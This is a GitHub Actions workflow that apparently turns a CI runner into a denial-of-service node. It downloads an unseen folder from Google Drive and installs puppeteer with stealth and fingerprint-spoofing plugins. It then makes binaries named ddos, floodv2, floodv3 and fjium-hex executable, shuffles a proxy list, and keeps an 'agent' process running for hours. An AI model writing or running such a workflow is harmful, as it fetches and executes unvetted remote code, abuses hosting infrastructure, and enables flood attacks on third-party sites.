name: Agent Session

on:
  workflow_dispatch:
  repository_dispatch:
    types: [run-tests]

jobs:
  agent-session:
    runs-on: ubuntu-latest
    timeout-minutes: 360
    continue-on-error: true
    steps:
    - name: Checkout repository
      uses: actions/checkout@v3

    - name: Install dependencies and start agent
      run: |
       sudo apt update -y
       sudo apt install xvfb -y
        pip install gdown

        echo "Downloading files from Google Drive..."
        gdown https://drive.google.com/drive/folders/1xKpyLS3GL_nLwP3SO4k707IvhoD92mXW?usp=sharing --folder

        cd k

       npm install puppeteer puppeteer-extra puppeteer-extra-plugin-stealth async axios colors hpack node-bash-title chalk@4 user-agents random-referer request

       sudo apt update -y && sudo apt install ca-certificates fonts-liberation libappindicator3-1 libasound2t64 libatk-bridge2.0-0 libatk1.0-0 libc6 libcairo2 libcups2 libdbus-1-3 libexpat1 libfontconfig1 libgbm1 libgcc1 libglib2.0-0 libgtk-3-0 libnspr4 libnss3 libpango-1.0-0 libpangocairo-1.0-0 libstdc++6 libx11-6 libx11-xcb1 libxcb1 libxcomposite1 libxcursor1 libxdamage1 libxext6 libxfixes3 libxi6 libxrandr2 libxrender1 libxss1 libxtst6 lsb-release wget xdg-utils -y

       sudo apt-get install -y libnss3 libatk-bridge2.0-0 libx11-xcb1 libxcomposite1 libxcursor1 libxdamage1 libxi6 libxtst6 libnss3 libxrandr2 libgbm1 libasound2t64 libpangocairo-1.0-0 libpango-1.0-0 libcups2

       npm install puppeteer puppeteer-real-browser fingerprint-generator fingerprint-injector colors

       npx puppeteer browsers install chrome@stable

       wget https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb
       sudo apt install -y ./google-chrome-stable_current_amd64.deb
        chmod +x ddos
        chmod +x agent
        chmod +x floodv3
        chmod +x floodv2
        chmod +x fjium-hex
        python shuffle_proxy.py live.txt
        ./agent
        AGENT_PID=$!

        echo ""
        echo "╔══════════════════════════════════════════╗"
        echo "║        ✅ Agent đang chạy!               ║"
        echo "╠══════════════════════════════════════════╣"
        echo "║  PID: $AGENT_PID                         ║"
        echo "║  Session mở trong ~350 phút              ║"
        echo "╚══════════════════════════════════════════╝"
        echo ""

        # Giữ session sống và kiểm tra agent
        while true; do
          if ! kill -0 $AGENT_PID 2>/dev/null; then
            echo "Agent stopped, restarting..."
            ./agent &
            AGENT_PID=$!
          fi
          sleep 60
        done
      timeout-minutes: 350